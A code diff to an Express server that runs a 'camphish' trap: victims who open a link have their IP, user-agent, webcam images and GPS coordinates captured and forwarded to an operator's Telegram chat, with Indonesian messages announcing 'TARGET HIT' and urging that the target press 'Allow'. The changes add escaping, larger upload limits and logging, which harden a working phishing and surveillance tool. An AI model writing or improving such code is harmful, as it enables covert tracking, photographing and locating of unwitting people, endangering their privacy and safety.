@@ -50,7 +50,17 @@ async function startServer() {
   // Default to the current AI Studio Dev URL. It will automatically update to Shared URL when someone visits it.
   let appHost = process.env.VITE_APP_URL || "https://ais-dev-wgiyctmskpzuuihqjrqsoy-125749415297.asia-southeast1.run.app";
 
-  app.use(express.json());
+  const escapeHTML = (text: string) => {
+    return text.replace(/[&<>"']/g, (m) => ({
+      '&': '&amp;',
+      '<': '&lt;',
+      '>': '&gt;',
+      '"': '&quot;',
+      "'": '&#039;'
+    }[m] || m));
+  };
+
+  app.use(express.json({ limit: '15mb' }));
 
   app.use((req, res, next) => {
     // Attempt to capture public URL from host or x-forwarded-host
@@ -173,13 +183,15 @@ async function startServer() {
       let msg = `🌟 <b>TARGET HIT DETECTED!</b> 🌟\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n` +
                 `📅 <b>Waktu:</b> <code>${timestamp} WIB</code>\n` +
-                `🌐 <b>IP Address:</b> <code>${ip}</code>\n` +
-                `📁 <b>Template:</b> <code>${templates[tmplId] ? templates[tmplId].name : 'Default'}</code>\n` +
-                `🖥️ <b>User-Agent:</b>\n<code>${userAgent}</code>\n` +
+                `🌐 <b>IP Address:</b> <code>${escapeHTML(String(ip))}</code>\n` +
+                `📁 <b>Template:</b> <code>${templates[tmplId] ? escapeHTML(templates[tmplId].name) : 'Default'}</code>\n` +
+                `🖥️ <b>User-Agent:</b>\n<code>${escapeHTML(String(userAgent))}</code>\n` +
                 `━━━━━━━━━━━━━━━━━━━━\n` +
                 `💡 <i>Menunggu data Camera/GPS... Pastikan target menekan <b>"Allow"</b> pada browser mereka.</i>`;
 
-      bot.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(console.error);
+      bot.telegram.sendMessage(chatId, msg, { parse_mode: 'HTML' }).catch(err => {
+        console.error("Telegram Send Error (HIT):", err);
+      });
     }
 
     const template = templates[tmplId] || templates['1'];
@@ -193,8 +205,9 @@ async function startServer() {
   });
 
   // Handle Camphish Image Upload
-  app.post('/api/log/:id/cam', express.json({limit: '10mb'}), (req, res) => {
+  app.post('/api/log/:id/cam', (req, res) => {
     const id = req.params.id;
+    console.log(`[CAM] Received request for ID: ${id}`);
     const chatId = getChatIdFromTrapId(id);
     if (chatId && process.env.TELEGRAM_BOT_TOKEN) {
       const { image } = req.body;
@@ -213,14 +226,21 @@ async function startServer() {
         bot.telegram.sendPhoto(chatId, { source: imageBuffer }, { 
           caption, 
           parse_mode: 'HTML' 
-        }).catch(console.error);
+        }).catch(err => {
+          console.error("Telegram SendPhoto Error:", err);
+        });
+      } else {
+        console.warn("[CAM] No image data in request body");
       }
+    } else {
+      console.warn(`[CAM] No valid chatId (${chatId}) or Token missing`);
     }
     res.sendStatus(200);
   });
 
-  app.post('/api/log/:id/gps', express.json(), (req, res) => {
+  app.post('/api/log/:id/gps', (req, res) => {
     const id = req.params.id;
+    console.log(`[GPS] Received request for ID: ${id}`);
     const chatId = getChatIdFromTrapId(id);
     if (chatId && process.env.TELEGRAM_BOT_TOKEN) {
       const { lat, lon, acc } = req.body;
@@ -240,7 +260,9 @@ async function startServer() {
       bot.telegram.sendMessage(chatId, msg, { 
         parse_mode: 'HTML', 
         disable_web_page_preview: false 
-      }).catch(console.error);
+      }).catch(err => {
+        console.error("Telegram Error (GPS):", err);
+      });
     }
     res.sendStatus(200);
   });
